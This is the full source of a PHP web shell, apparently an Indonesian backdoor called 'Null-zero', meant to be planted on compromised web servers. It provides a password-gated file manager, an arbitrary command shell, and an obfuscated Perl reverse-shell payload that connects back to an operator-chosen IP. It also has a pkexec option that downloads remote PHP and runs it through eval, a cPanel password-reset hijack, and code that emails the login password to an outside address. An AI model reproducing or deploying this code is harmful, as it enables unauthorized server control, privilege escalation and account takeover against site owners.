<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

// Konfigurasi
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

// Fungsi untuk tampilan halaman login
function show_login_page($message = "")
{
?>
    <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://raw.githubusercontent.com/Cnull00/file_file/main/null.png'); /* Add the path to your background image */
            background-size: cover;
            background-position: center;
        }

        form {
            text-align: center;
        }

        input[type="password"] {
            border: none;
            border-bottom: 1px solid black;
            padding: 2px;
            background-color: transparent;
            outline: none;
        }

        input[type="password"]:focus {
            outline: none;
        }

        input[type="submit"] {
            border: none;
            padding: 4.5px 20px;
            background-color: transparent;
            color: transparent;
        }
    </style>
</head>

<body>
    <form action="" method="post">
        <div>
            <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
        </div>
    </form>
</body>

</html>

<?php
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2a$10$5QZbD8uF4KUAo0LkbVmR4.Ax09Szkswk6HTiAjk2YXFv/wHxWmwVq'; 

    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;

        // Monitoring: kirim notifikasi ke email saat login berhasil
        if (array_key_exists('watching', $_POST)) {
            $tmp = $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\n" . $_POST['pass'];
            @mail('nullcyber0@gmail.com', 'Notif', $tmp); // Edit alamat email ke yang sesuai
        }
    } else {
        show_login_page();
    }
}
	// Fungsi cek Perl
function fungsi_perl() {
    $perlAvailability = shell_exec('which perl');
    $perlStatus = (isset($perlAvailability) && !empty($perlAvailability)) ? 'ON' : 'OFF';

    echo "<h4 class='text-light'>Perl Status: {$perlStatus}</h4>";

    // Cek apakah shell_exec dinonaktifkan
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        // Shell_exec aktif, Perl dapat digunakan
        echo "Perl dapat digunakan.";
    } else {
        // Shell_exec dinonaktifkan, Perl tidak dapat digunakan
        echo "Perl tidak bisa digunakan.";
    }
}

//fungsi logout
    function fungsi_logout() {
       session_unset(); // Menghapus semua variabel sesi
        session_destroy(); // Menghancurkan sesi
        header('Location: ' . $_SERVER['REQUEST_URI']); // Redirect ke halaman ini
        exit();
    }

    if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["logout"])) {
        // Jika parameter GET "logout" ada, jalankan fungsi logout
        fungsi_logout();
    }

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Null-zero</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        /* CSS untuk menyembunyikan elemen audio */
    </style>
</head>

<body class="bg-dark">

    <?php


    //function
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
{
    $a = array("/", "\\", ".", ":"); // Tanda titik dua di sini seharusnya tidak bermasalah
    $b = array("ক", "খ", "গ", "ঘ");
    return str_replace($a, $b, $path);
}

function decodePath($path)
{
    $a = array("/", "\\", ".", ":");
    $b = array("ক", "খ", "গ", "ঘ");
    return str_replace($b, $a, $path);
}




    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>nalert('Directory is Corrupted and Unreadable.');nwindow.location.replace('?');n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://raw.githubusercontent.com/Cnull00/file_file/main/null.ico" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "ঘ", $paths[$i]);
            if ($i != $id)
                echo "ক";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<div class="dropdown">
  <a class="btn btn-info dropdown-toggle" href="#" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
  MENU SHELL
  </a>

  <ul class="dropdown-menu dropdown-menu-dark" aria-labelledby="dropdownMenuLink">
    <li><a class="dropdown-item" href="?">Home</a></li>
    <li><a class="dropdown-item" href="?upload&q=' . urlencode(encodePath(PATH)) . '">File Uploader</a></li>
    <li><a class="dropdown-item" href="?cmd&q=' . urlencode(encodePath(PATH)) . '">Command Shell</a></li>
    <li><a class="dropdown-item" href="?info&q=' . urlencode(encodePath(PATH)) . '">Info</a></li>
    <li><a class="dropdown-item" href="?pbc&q=' . urlencode(encodePath(PATH)) . '">PerlBackconnect</a></li>
    <li><a class="dropdown-item" href="?adminer&q=' . urlencode(encodePath(PATH)) . '">adminer</a></li>
    <li><a class="dropdown-item" href="?pkex&q=' . urlencode(encodePath(PATH)) . '">pkexec</a></li>
    <li><a class="dropdown-item" href="?cpcrk&q=' . urlencode(encodePath(PATH)) . '">crack cp</a></li>
    <li><a class="dropdown-item" href="?aksi=buatfolder&q=' . urlencode(encodePath(PATH)) . '">buat folder</a></li>
    <li><a class="dropdown-item" href="?aksi=buatfile&q=' . urlencode(encodePath(PATH)) . '">buat file</a></li>
    <li><a class="dropdown-item" href="?logout">Logout here</a></li>
  </ul>
</div>
</div>
</nav>');
    if (isset($_GET['p'])) {

        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-active text-light">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Chmod' href='?q=" . urlencode(encodePath(PATH)) . "&c=" . $folder . "'><i class='fa-sharp fa-solid fa-key'></i></a>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
          <td>
          <a title='Chmod' href='?q=" . urlencode(encodePath(PATH)) . "&c=" . $file . "'><i class='fa-solid fa-key'></i></a>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";		
        }
        echo "  </tbody>
</table>"
		;
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['upload'])) {
        echo '
<div class="container mt-4 text-center">
    <form method="post" enctype="multipart/form-data" style="color: white;">
        <h4>Pilih file:</h4>
        <input type="file" name="fileToUpload" id="fileToUpload" class="form-control mb-3">
        <input type="submit" class="btn btn-primary" value="Upload" name="upload">
    </form>
</div>';
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["a"])) {
    // Cek apakah ada kesalahan saat mengunggah file
    if ($_FILES["a"]["error"] > 0) {
        echo "Terjadi kesalahan saat mengunggah file.";
    } else {
        $uploadDir = PATH . "/"; // Direktori tempat file akan disimpan, sama dengan direktori skrip ini
        $uploadFile = $uploadDir . basename($_FILES["a"]["name"]);
        
        // Cek apakah file sudah ada
        if (file_exists($uploadFile)) {
            echo "Maaf, file sudah ada.";
        } else {
            // Pindahkan file ke direktori yang sama dengan skrip PHP ini
            if (move_uploaded_file($_FILES["a"]["tmp_name"], $uploadFile)) {
                echo "File ". basename( $_FILES["a"]["name"]). " telah diunggah.";
            } else {
                echo "Maaf, terjadi kesalahan saat mengunggah file.";
            }
        }
    }
}
echo('<div class="container mt-4 text-center">
<font size="6px" color="green">Uploader bypass</font>
<form method="post" enctype="multipart/form-data">
  <input type="file" name="a" class="form-control mb-3">
  <input type="submit" class="btn btn-danger" value="Unggah">
</form>
</div>');
echo '<center><a href="'.$uploadFile.'">Akses file</a></center>';
}

if(isset($_GET['aksi']) && $_GET['aksi'] == 'buatfolder'){
	function hai(){
		echo "<script>window.location='?q=".PATH."';</script>";
		echo "<script>alert('Folder Sukses Dibuat!');</script>";
	}
	if(isset($_POST["folderss"])){
		$nama_folder = PATH.'/'.$_POST["namaF"];
		mkdir($nama_folder);
		hai();
	}
		
	echo '
	<div class="row mt-3">
		<div class="col">
			<form method="post">
				<input type="text" name="namaF" class="form-control mb-3" placeholder="Nama Folder">
		</div>
		<div class="col">
			<input type="submit" class="btn btn-outline-primary btn-block" value="Buat" name="folderss"></form>
		</div>
	</div>';
}
if(isset($_GET['aksi']) && $_GET['aksi'] == 'buatfile'){
	if(isset($_POST["buat"])){
	$namaF = PATH.'/'.$_POST["nama_file"];
	$isi = $_POST["isi"];
	$buat = fopen($namaF,"w");
	fwrite($buat,$isi);
	fclose($buat);
	if($buat == TRUE){
		echo "<script>window.location='?q=".PATH."'; alert('Sukses')</script>";
}else{
echo "<script>window.location='?q=".PATH."'; alert('Gagal!!!')</script>";
}
}
echo '<div class="row mt-3">
		<div class="col">
		<form method="post" class="mt-3">
		<input type="text" class="form-control mb-3" placeholder="Nama File" name="nama_file">
		</div>
		<div class="col">
			<input type="submit" name="buat" class="btn btn-outline-primary" value="Buat">
		</div>
	</div>';
}


if (isset($_GET['cpcrk'])) {
    $user = get_current_user();
    $host = $_SERVER['HTTP_HOST'];

    if (isset($_POST['submit'])) {
        $email = $_POST['email'];
        $info = 'email:' . $email;

        @file_put_contents('/home/' . $user . '/.cpanel/contactinfo', $info);
        @file_put_contents('/home/' . $user . '/.contactinfo', $info);

        $protocol = "https://";
        $resetLink = $host . ':2083/resetpass?start=1';

        $readContactInfo = @file('/home/' . $user . '/.cpanel/contactinfo');
        
        if (!$readContactInfo) {
            echo '<div class="alert alert-danger" role="alert">Maaf, gagal diakses!</div>';
        } else {
        	echo'<div class="alert alert-success" role="alert">
				<center>SALIN INI STER TRUZZ GASS <BR><BR></center>
				<center><input type="text" value="' . $user . '" id="user"> <button onclick="copyUsername()">SALIN TEXT</button></center>
				<br/><center><a target="_blank" href="' . $protocol . '' . $resetLink . '"><button type="button" class="btn btn-danger">GAS!!</button></a><br><br></center>
			</div>';
			
        }
    }

    echo '<div class="alert alert-success mt-3">';
    echo '<form action="#" method="post">';
    echo 'Email: <input type="email" name="email" placeholder="Email Kau Ler" />';
    echo '<input type="submit" name="submit" value="Crack" />';
    echo '</form></div>';
}

if (isset($_GET["info"])) {
    echo '<!-- Button untuk memicu offcanvas -->
    <button type="button" class="btn btn-primary" data-bs-toggle="offcanvas" data-bs-target="#offcanvasRight">
        Lihat Disable Function
    </button>
    <div class="alert alert-success mt-3">
        <h3 class="text-center">Informasi Server</h3><hr>
        <ul>
            <li><strong>Nama Server:</strong> ' . $_SERVER["SERVER_NAME"] . '</li>
            <li><strong>Ip Address:</strong> ' . $_SERVER["SERVER_ADDR"] . '</li>
            <li><strong>Port:</strong> ' . $_SERVER["SERVER_PORT"] . '</li>
            <li><strong>Protokol:</strong> ' . $_SERVER["SERVER_PROTOCOL"] . '</li>
            <li><strong>Save Data:</strong> ' . $_SERVER["HTTP_SAVE_DATA"] . '</li>
            <li><strong>Koneksi:</strong> ' . $_SERVER["HTTP_CONNECTION"] . '</li>
            <li><strong>Software:</strong> ' . $_SERVER["SERVER_SOFTWARE"] . '</li>
            <li><strong>Dokumen Root:</strong> ' . $_SERVER["DOCUMENT_ROOT"] . '</li>
            <li><strong>G-Interface:</strong> ' . $_SERVER["GATEWAY_INTERFACE"] . '</li>
            <li><strong>R-Method:</strong> ' . $_SERVER["REQUEST_METHOD"] . '</li>
            <li><strong>Your Browser:</strong> ' . $_SERVER["HTTP_USER_AGENT"] . '</li>
        </ul>
    </div>

    

    <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasRight" aria-labelledby="offcanvasRightLabel">
        <div class="offcanvas-header">
            <h5 id="offcanvasRightLabel">Disable Function</h5>
            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        </div>
        <div class="offcanvas-body bg-dark">
    ';

    $disabledFunctions = ini_get('disable_functions');

    if (empty($disabledFunctions)) {
        echo "<h6 class='text-light'>Tidak ada fungsi yang dinonaktifkan.</h6>";
    } else {
        $disabledFunctionsArray = explode(',', $disabledFunctions);

        echo "<h6 class='text-light'>Fungsi yang dinonaktifkan:</h6>";
        echo "<div class='table-responsive text-center'>";
        echo "<table class='table table-bordered table-light mx-auto' style='width: 50%;'>";
        echo "<thead class='thead-dark'><tr><th scope='col'>No</th><th scope='col'>Nama Fungsi</th></tr></thead>";
        echo "<tbody>";

        $counter = 1;
        foreach ($disabledFunctionsArray as $function) {
            echo "<tr><td>{$counter}</td><td>{$function}</td></tr>";
            $counter++;
        }

        echo "</tbody></table>";
        echo "</div>";
    }

    echo '
        </div>
    </div>
    <marquee><h4 class="text-light">Bekdur ini masih dalam pengembangan jadi maklum saja klo masih banyak bug</h4></marquee>
    ';
}
if(isset($_GET['pbc'])) {
    echo "<div style=\"font-size: 14px; font-family: 'Comic Sans MS'; color: white; text-align: center; margin-top: 50px;\">";
    echo '<form method="POST" action="" style="color: white; display: inline-block;">';
    echo 'Client IP: <input type="text" name="ip" value=' . $_SERVER['REMOTE_ADDR'] . ' style="color: black;"><br>';
    echo 'Connection Port: <input type="text" name="port" style="color: black;"><br>';
    echo '<input type="submit" name="sbm" value=">>" style="color: black;" />';
    echo '</form>';
    echo '</div>';
}

if (isset($_GET['cmd'])) {
    echo "<div style=\"font-size: 14px; font-family: 'Courier New', monospace; color: white; text-align: center; margin-top: 50px;\">";
    echo '<h2>.::[ Shell Command ]::.</h2>';
    echo '<form method="post" action="">';
    echo 'terminal:~$ <input name="cmd" type="text" placeholder="Nullcyber" style="width:300px; background-color: #333; color: #fff; border: none; padding: 5px;"/>';
    echo ' <input type="submit" value=">>" style="background-color: #444; color: #fff; border: none; padding: 5px; cursor: pointer;"/>';
    echo '</form>';
    
    if (!empty($_POST['cmd'])) {
        echo '<div style="background-color: #000; color: #0f0; text-align: left; margin-top: 20px; padding: 10px; border: 1px solid #555;">';
        echo '<pre>';
        
        $cmd = $_POST['cmd'];

        // Deteksi OS dan jalankan perintah yang sesuai
        if (stripos(PHP_OS, 'WIN') === 0) {
            // Sistem Windows
            $output = shell_exec($cmd . ' 2>&1');
        } else {
            // Sistem Linux/Unix
            $output = shell_exec($cmd . ' 2>&1');
        }

        echo htmlspecialchars($output);
        echo '</pre>';
        echo '</div>';
    }
    echo '</div>';
}


if(isset($_POST['sbm'])) {
    $r = $_POST["ip"];
    $s = $_POST["port"];
    $p1 = 'hVNhb5swEP0eKf/hSqsGJFig/TApEdWylKxZt1ABiSYhFBlyTVBcO8JmazTtvw8MVKnWqSDh83tnv2ffcX42LEUxTHM2PGBB+71+rxQIc380Cnm2RzmuoQtxFBKfwIWBSk2J2A0aZhJ8mbqfqu9KzQ9FziRoYFmuG8efSbafcsYwkxDukNIkcV3LAtbyKX8G/ovhBtIjLEpKs2OKRZfEADS1af4IuhI6c68M+F1D0AotBdniCC5siO+4kAnED7yoBsaapbDJETTvWaU4Vx8/2NXrgHPtXEOb8qc79MmB6+ksp3hH2IaigoRi9dCf3nuRCQ+z9XxRBzWwDqPAm3w3YYvyUHDJ0yMjT6gPZHYYGAbwQvloPcdWAktGUoogOQQoOP2JUNtvHWXNlb1o1dJksynWOVP3sIqdxIScoVwTyTvMTox3pLpSnEg1ha2jRsy6IaXkj7QUO91QGfyATA+j2/nCBO3msknTXnP+MjL/x3lB8A/X2asq/NbzTvOcOte1kgmsjjQPo9n8mzeGZh5OVl6NwRizHa/AqhxgERi/hIpQO7WmWk+teNWZfteZ07o1bRtOGvMtw18J2xIGKWFHsq+GjEvYcyY5hR+3J4tf+W9/rcbCuefP+r2/';
    
    $dec = gzinflate(base64_decode($p1));
    $fname = fopen('backconn.pl','w');
    fwrite($fname, $dec); 
    fclose($fname);
    
    $d = "backconn.pl";
    $ch = "chmod +x " . $d;
    $permission = system($ch);
    
    $z = "perl " . $d . " " . $r . " " . $s;
    $run = system($z);
}  
if (isset($_GET['pkex'])){
    echo'<div class="text-center text-light">';
    function get_contents($url){ $ch = curl_init("$url"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); $result = curl_exec($ch); return $result; } $a = get_contents('https://raw.githubusercontent.com/Cnull00/shellsup/main/pwnket.php'); eval('?>'.$a);
    echo'</div>';
}

if (isset($_GET['adminer'])) {
    function downloadFile($url, $destination)
    {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Tambahkan opsi untuk mengikuti redirect
    
        $file = curl_exec($ch);
        curl_close($ch);
    
        if ($file !== false) {
            file_put_contents($destination, $file);
            header("Location: $destination"); // Arahkan pengguna ke destination
            exit; // Pastikan tidak ada output lain sebelum header
        } else {
            echo "Gagal mengunduh file dari $url";
        }
    }
    
    $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $destination = 'adminer-4.8.1.php';
    
    downloadFile($url, $destination);
}
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['c'])) {
    if (!empty($_GET['c']) && isset($_GET['q'])) {
        echo '
        <form method="post">
            <h4 class="text-light">Chmod</h4>
            <input type="text" name="permissions" placeholder="Enter permissions (e.g., 0755)">
            <input type="submit" class="btn btn-info" value="Change" name="chmod">
        </form>';
        
        if (isset($_POST['chmod'])) {
            $file = PATH . "/" . $_GET['c'];
            $permissions = octdec($_POST['permissions']); // Convert input to octal
            
            // Cek apakah path adalah folder
            if (is_dir($file)) {
                // Terapkan chmod secara rekursif jika diperlukan
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                $chmod_success = true;
                
                foreach ($iterator as $item) {
                    if (!chmod($item->getPathname(), $permissions)) {
                        $chmod_success = false;
                    }
                }

                // Chmod pada folder utama juga
                if (!chmod($file, $permissions)) {
                    $chmod_success = false;
                }

                if ($chmod_success) {
                    echo ("<script>alert('Permissions changed successfully.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred while changing permissions.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            } else {
                // Jika bukan folder, jalankan chmod biasa
                if (chmod($file, $permissions)) {
                    echo ("<script>alert('Permissions changed successfully.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }
}
    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = fopen($filename,"w");
        if(fwrite($open,$data)) {
            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
        fclose($open);
    }
        }
    }

    if (isset($_POST["upload"])) {
        $target_file = PATH . "/". $_FILES["fileToUpload"]["name"];
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
        } else {
            echo "<p>Sorry, there was an error uploading your file.</p>";
        }
    }
    

    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
        
    ?>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>

</html>
